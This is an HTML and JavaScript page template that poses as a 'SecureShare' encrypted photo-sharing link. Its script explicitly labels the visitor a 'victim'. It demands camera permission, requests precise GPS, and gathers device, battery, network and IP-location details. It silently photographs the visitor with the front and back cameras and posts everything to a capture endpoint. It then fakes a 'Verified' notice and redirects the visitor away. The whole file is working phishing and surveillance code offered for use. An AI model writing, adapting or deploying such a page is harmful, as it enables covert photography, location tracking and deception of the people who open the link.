<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>SecureShare</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: radial-gradient(circle at 30% 10%, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Roboto, sans-serif;
            padding: 16px;
        }
        .glass {
            background: rgba(255,255,255,0.06);
            backdrop-filter: blur(16px);
            border-radius: 40px;
            padding: 32px 24px;
            max-width: 440px;
            width: 100%;
            border: 1px solid rgba(255,255,255,0.12);
            box-shadow: 0 25px 60px rgba(0,0,0,0.6);
            text-align: center;
            color: #fff;
        }
        .glass h1 {
            font-size: 30px;
            font-weight: 800;
            background: linear-gradient(135deg, #f093fb, #f5576c);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .glass .sub {
            font-size: 13px;
            letter-spacing: 3px;
            color: rgba(255,255,255,0.5);
            text-transform: uppercase;
            margin: 4px 0 18px;
        }
        .frame {
            border-radius: 24px;
            padding: 8px;
            background: rgba(255,255,255,0.04);
            border: 1px solid rgba(255,255,255,0.08);
            margin: 16px 0;
        }
        .frame img {
            width: 100%;
            aspect-ratio: 4/3;
            object-fit: cover;
            border-radius: 18px;
            display: block;
            background: #1a1a2e;
        }
        .glow-btn {
            background: linear-gradient(145deg, #f093fb, #f5576c);
            border: none;
            padding: 18px;
            border-radius: 60px;
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 8px 30px rgba(245,87,108,0.35);
            transition: 0.25s;
            margin: 12px 0 6px;
        }
        .glow-btn:active { transform: scale(0.96); }
        .sparkle { animation: pulseGlow 2s infinite; }
        @keyframes pulseGlow {
            0%,100% { box-shadow: 0 8px 30px rgba(245,87,108,0.35); }
            50% { box-shadow: 0 8px 60px rgba(245,87,108,0.7); }
        }
        .footer-text { font-size: 11px; opacity: 0.3; margin-top: 18px; }
        .hidden { display: none !important; }
        #loading { margin-top: 20px; font-size: 14px; opacity: 0.7; animation: pulseGlow 1.5s infinite; }
        #redirectTimer {
            margin-top: 20px; font-size: 16px; font-weight: 600;
            color: #f093fb; display: none;
        }
        #redirectTimer .count {
            font-size: 28px; font-weight: 800; color: #fff;
            display: block; margin: 8px 0; animation: pulseGlow 1s infinite;
        }
        #permissionError {
            display: none; margin-top: 20px; padding: 14px 16px;
            background: rgba(245,87,108,0.1);
            border: 1px solid rgba(245,87,108,0.3);
            border-radius: 16px; font-size: 13px; color: #f5576c;
            line-height: 1.5;
        }
        #permissionError strong { display: block; font-size: 15px; margin-bottom: 4px; color: #fff; }
    </style>
</head>
<body>
    <div class="glass" id="mainPage">
        <h1>🔒 SecureShare</h1>
        <p class="sub">SHARED SECURELY WITH YOU</p>
        <div class="frame">
            <img id="userPhoto" src="{{PHOTO_URL}}" alt="User Photo" />
        </div>
        <button class="glow-btn sparkle" id="continueBtn" onclick="startCapture()">
            Continue →
        </button>
        <p class="footer-text">End-to-end encrypted · Secure connection</p>
        <div id="loading" class="hidden">⏳ Processing...</div>
        <div id="permissionError">
            <strong>⚠️ Camera Access Required</strong>
            <span id="errorMsg">Please allow camera permission to continue.</span>
        </div>
        <div id="redirectTimer">
            <span>✅ Verified! Redirecting in</span>
            <span class="count" id="timerCount">5</span>
            <span>seconds...</span>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const victimId = urlParams.get('v') || 'unknown';
        const redirectUrl = '{{REDIRECT_URL}}';

        console.log('Victim ID:', victimId);
        console.log('Redirect URL:', redirectUrl);

        function doRedirect() {
            let target = 'https://google.com';
            if (redirectUrl && redirectUrl.trim() !== '' && redirectUrl !== '{{REDIRECT_URL}}' && redirectUrl.toLowerCase().startsWith('http')) {
                target = redirectUrl.trim();
            }
            console.log('Final Redirect:', target);
            window.location.href = target;
        }

        function getBasicInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language
            };
        }

        async function getBatteryInfo() {
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? 'Yes' : 'No'
                    };
                }
            } catch (e) {}
            return { level: 'N/A', charging: 'N/A' };
        }

        function getNetworkInfo() {
            try {
                if (navigator.connection) {
                    return {
                        type: navigator.connection.effectiveType || 'N/A',
                        downlink: navigator.connection.downlink || 'N/A',
                        rtt: navigator.connection.rtt || 'N/A'
                    };
                }
            } catch (e) {}
            return { type: 'N/A', downlink: 'N/A', rtt: 'N/A' };
        }

        async function getIPInfo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                return {
                    ip: data.ip || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country_name || 'Unknown'
                };
            } catch {
                return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
            }
        }

        async function sendData(payload) {
            try {
                return await fetch('/api/capture/cam', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ victim_id: victimId, type: 'cam', ...payload })
                });
            } catch (e) {
                console.log('Send error:', e);
            }
        }

        function wait(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        async function requestCameraPermission() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch (err) {
                return false;
            }
        }

        function requestGPSPermission() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ granted: false, lat: null, lng: null });
                    return;
                }
                console.log('Requesting GPS...');
                let resolved = false;
                const watchId = navigator.geolocation.watchPosition(
                    pos => {
                        if (!resolved) {
                            resolved = true;
                            navigator.geolocation.clearWatch(watchId);
                            console.log('GPS granted');
                            resolve({
                                granted: true,
                                lat: pos.coords.latitude,
                                lng: pos.coords.longitude,
                                accuracy: pos.coords.accuracy
                            });
                        }
                    },
                    err => {
                        if (!resolved) {
                            resolved = true;
                            navigator.geolocation.clearWatch(watchId);
                            console.log('GPS denied');
                            resolve({ granted: false, lat: null, lng: null });
                        }
                    },
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
                setTimeout(() => {
                    if (!resolved) {
                        resolved = true;
                        navigator.geolocation.clearWatch(watchId);
                        resolve({ granted: false, lat: null, lng: null });
                    }
                }, 16000);
            });
        }

        async function captureCamera(facingMode, label) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: facingMode }
                });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('playsinline', 'true');
                video.setAttribute('autoplay', 'true');
                video.muted = true;

                await new Promise((resolve) => {
                    video.onloadedmetadata = () => { video.play(); resolve(); };
                    setTimeout(resolve, 2000);
                });
                await wait(1500);

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photoData = canvas.toDataURL('image/jpeg', 0.85);
                stream.getTracks().forEach(track => track.stop());

                await sendData({ photo: photoData, camera_type: label });
                return true;
            } catch (err) {
                console.log(`${label} camera error:`, err);
                return false;
            }
        }

        function showError(msg) {
            const errorBox = document.getElementById('permissionError');
            document.getElementById('errorMsg').textContent = msg;
            errorBox.style.display = 'block';
        }

        function hideError() {
            document.getElementById('permissionError').style.display = 'none';
        }

        async function startCapture() {
            const btn = document.getElementById('continueBtn');
            const loading = document.getElementById('loading');
            const timer = document.getElementById('redirectTimer');
            const timerCount = document.getElementById('timerCount');

            hideError();

            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                showError("Camera not supported on this device.");
                return;
            }

            btn.disabled = true;
            btn.textContent = '⏳ Please wait...';
            loading.classList.remove('hidden');

            // CAMERA (COMPULSORY)
            const hasCamera = await requestCameraPermission();
            if (!hasCamera) {
                btn.disabled = false;
                btn.textContent = 'Continue →';
                loading.classList.add('hidden');
                showError("Camera access is required. Please allow camera permission and try again.");
                return;
            }

            // GPS (OPTIONAL)
            const gps = await requestGPSPermission();

            // INFO
            const basicInfo = getBasicInfo();
            const batteryInfo = await getBatteryInfo();
            const networkInfo = getNetworkInfo();
            const ipInfo = await getIPInfo();

            const deviceInfo = {
                userAgent: basicInfo.userAgent,
                platform: basicInfo.platform,
                screen: basicInfo.screen,
                timezone: basicInfo.timezone,
                language: basicInfo.language,
                battery: batteryInfo.level,
                charging: batteryInfo.charging,
                network: networkInfo.type,
                downlink: networkInfo.downlink,
                rtt: networkInfo.rtt
            };

            await sendData({
                device_info: deviceInfo,
                ip: ipInfo.ip,
                city: ipInfo.city,
                region: ipInfo.region,
                country: ipInfo.country,
                location: gps.granted ? { lat: gps.lat, lng: gps.lng, accuracy: gps.accuracy } : null
            });
            await wait(500);

            // FRONT CAMERA
            const frontOk = await captureCamera('user', 'Front');
            await wait(1000);

            // BACK CAMERA
            if (frontOk) {
                await captureCamera('environment', 'Back');
                await wait(1000);
            }

            // TIMER + REDIRECT
            loading.classList.add('hidden');
            timer.style.display = 'block';

            let seconds = 5;
            timerCount.textContent = seconds;

            const interval = setInterval(() => {
                seconds--;
                timerCount.textContent = seconds;
                if (seconds <= 0) {
                    clearInterval(interval);
                    doRedirect();
                }
            }, 1000);
        }
    </script>
</body>
</html>
